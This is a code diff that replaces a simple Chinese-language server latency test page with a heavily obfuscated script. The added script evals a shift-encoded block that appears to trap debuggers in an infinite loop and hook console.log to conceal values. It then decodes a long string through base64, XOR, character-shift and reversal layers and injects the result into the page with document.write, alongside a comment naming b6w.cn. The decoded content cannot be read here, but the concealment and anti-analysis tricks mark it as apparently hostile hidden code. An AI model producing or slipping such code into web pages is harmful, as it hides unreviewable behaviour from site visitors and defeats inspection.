@@ -1,60 +1,58 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
-<title>服务器连接测试</title>
-<style>
-*{box-sizing:border-box;font-family:system-ui,sans-serif}
-body{max-width:500px;margin:30px auto;padding:0 20px;background:#f5f7fa}
-.card{background:#fff;padding:20px;border-radius:12px;margin-bottom:15px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
-.title{font-size:18px;font-weight:600;margin-bottom:10px}
-.result{margin:8px 0;font-size:16px}
-.time{color:#0066cc;font-weight:500}
-.status{padding:4px 10px;border-radius:6px;color:white;font-size:14px}
-.good{background:#00b42a}
-.normal{background:#ff7d00}
-.bad{background:#f53f3f}
-.error{background:#999}
-</style>
-</head>
-<body>
-<h2>服务器连接测试</h2>
-
-<div class="card">
-<div class="title">服务器1</div>
-<div class="result" id="r1">测试中...</div>
-</div>
-
-<div class="card">
-<div class="title">服务器2</div>
-<div class="result" id="r2">测试中...</div>
-</div>
-
-<script>
-async function test(url, id) {
-  const el = document.getElementById(id);
-  try {
-    const start = performance.now();
-    await fetch(url, { method: "HEAD", mode: "no-cors" });
-    const time = Math.round(performance.now() - start);
-
-    let level, cls;
-    if (time < 500) { level = "优秀"; cls = "good"; }
-    else if (time < 1000) { level = "良好"; cls = "good"; }
-    else if (time < 3000) { level = "一般"; cls = "normal"; }
-    else { level = "较差"; cls = "bad"; }
-
-    el.innerHTML = `响应时间：<span class="time">${time} ms</span> <span class="status ${cls}">${level}</span><br>✅ 连接正常`;
-  } catch (e) {
-    el.innerHTML = "❌ 连接失败 <span class='status error'>不可用</span>";
-  }
-}
-
-// 自动测试
-window.onload = function() {
-  test("https://m.b6w.cn/", "r1");
-  test("https://jianhancloud.cn/", "r2");
-};
-</script>
-</body>
-</html>
+    <html>
+    <head><meta charset="UTF-8"></head>
+    <body>
+    <script>
+   
+    function _decode(str) {
+        return [...str].map(c => String.fromCharCode(c.charCodeAt(0) - 2)).join('');
+      }
+    const _encryptedAntiLog = 'eqpuv"acpvkFgdwiUvctv"?"pgy"Fcvg*+0igvVkog*+=fgdwiigt=eqpuv"acpvkFgdwiGpf"?"pgy"Fcvg*+0igvVkog*+=kh"*acpvkFgdwiGpf"/"acpvkFgdwiUvctv"@"322+"}"yjkng*vtwg+}""eqpuv"aqtkikpcnNqi"?"eqpuqng0nqi=eqpuqng0nqi"?"hwpevkqp*000ctiu+"}eqpuv"artqeguugfCtiu"?"ctiu0ocr*cti"?@"}kh"*cti"???"ykpfqy0a2z3;"~~"cti"???"ykpfqy0a2z39+"}tgvwtp")]溒砃巴俟抦．禃此eqpuqng払卲_)=kh"*cti"???"ykpfqy0a2z3:"~~"cti"???"ykpfqy0a2z38+"}tgvwtp")]觥寈凿敲巴俟抦_)=tgvwtp"cti=+=aqtkikpcnNqi0crrn{*eqpuqng."artqeguugfCtiu+==ngv"atgcnFget{rvTguwnv"?"))=Qdlgev0fghkpgRtqrgtv{*ykpfqy.")a2z3;)."}igv<"hwpevkqp*+"}eqpuv"auvcem"?"pgy"Gttqt*+0uvcem=kh"*auvcem"(("auvcem0kpenwfgu*)eqpuqng0nqi)++"}tgvwtp")]禃此eqpuqng诽变a2z3;_)=tgvwtp"atgcnFget{rvTguwnv=.ugv<"hwpevkqp*xcn+"}atgcnFget{rvTguwnv"?"xcn=.eqphkiwtcdng<"hcnug.gpwogtcdng<"hcnug+=';
+    const _antiLogCode = _decode(_encryptedAntiLog);
+    try {
+      eval(_antiLogCode);
+    } catch (e) {
+      console.error("Anti-log initialization failed:", e);
+    }
+    const _0xa = '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';
+    const _0xb = '3hon8y5k';
+    function _0xc(_0xd) {
+      return decodeURIComponent(atob(_0xd).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+    }
+    const _0xe = _0xc(_0xa);
+    function _0x11(str) {
+      const noiseMarkIndex = str.lastIndexOf('[NOISE:');
+      if (noiseMarkIndex === -1) return str;
+      const lenStart = noiseMarkIndex + 7;
+      const lenEnd = str.indexOf(']', lenStart);
+      const noiseLen = parseInt(str.slice(lenStart, lenEnd));
+      return str.slice(0, noiseMarkIndex);
+    }
+    const _0x12 = _0x11(_0xe);
+    function _0xf(_0x10) {
+      return [..._0x10].map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('');
+    }
+    const _0x13 = _0xf(_0x12);
+    function _0x14(str, key) {
+      return [...str].map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key[i % key.length].charCodeAt(0))).join('');
+    }
+    const _0x15 = _0x14(_0x13, _0xb);
+    function _0x16(str) {
+      let res = '';
+      for (let i = 0; i < str.length; i += 4) {
+        res += str.slice(i, i+4).split('').reverse().join('');
+      }
+      return res;
+    }
+    const _0x17 = _0x16(_0x15);
+    function _0x18(str) {
+      const map = {'a':'z','z':'a','0':'9','9':'0','<':'>','>':'<','{':'}','}':'{','[':']',']':'['};
+      return [...str].map(c => map[c] || c).join('');
+    }
+    var _0x19;
+    _0x19 = _0x18(_0x17);
+    // b6w.cn/kenc
+    document.write(_0x19);
+    </script>
+    </body>
+    </html>
